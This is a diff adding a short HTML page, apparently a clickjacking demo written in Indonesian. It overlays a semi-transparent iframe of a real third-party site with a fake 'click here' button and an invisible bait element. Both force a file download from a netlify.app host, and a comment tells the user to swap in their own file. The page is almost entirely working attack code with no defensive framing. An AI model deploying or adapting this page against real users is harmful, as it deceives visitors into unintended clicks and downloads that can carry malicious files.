@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking Demo - Unduh Otomatis</title>
+  <style>
+    body {
+      background: #f2f2f2;
+      font-family: 'Segoe UI', sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+
+    .fake-ui {
+      position: relative;
+      z-index: 10;
+    }
+
+    .fake-button {
+      background-color: #ff6600;
+      color: white;
+      padding: 20px 40px;
+      font-size: 22px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      box-shadow: 0px 4px 10px rgba(0,0,0,0.2);
+      margin-top: 50px;
+    }
+
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      border: none;
+      width: 100vw;
+      height: 100vh;
+      z-index: 1;
+      opacity: 0.2;
+      pointer-events: auto;
+    }
+
+    #bait {
+      position: absolute;
+      top: 200px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 300px;
+      height: 80px;
+      z-index: 5;
+      opacity: 0;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="fake-ui">
+    <h1>Halaman Telah Dialihkan</h1>
+    <p>Klik tombol di bawah untuk melanjutkan</p>
+    <button class="fake-button" onclick="unduhFile()">Klik Disini</button>
+  </div>
+
+  <iframe src="https://ss2.darunnajah.com/"></iframe>
+
+  <div id="bait"></div>
+
+  <script>
+    function unduhFile() {
+      const a = document.createElement('a');
+      a.href = 'https://6800d3007440700f91806136--frabjous-druid-bc206a.netlify.app/index.html'; // ganti sesuai nama file kamu
+      a.download = 'index.html'; // nama file saat diunduh
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+
+    document.getElementById('bait').addEventListener('click', unduhFile);
+  </script>
+</body>
+</html>
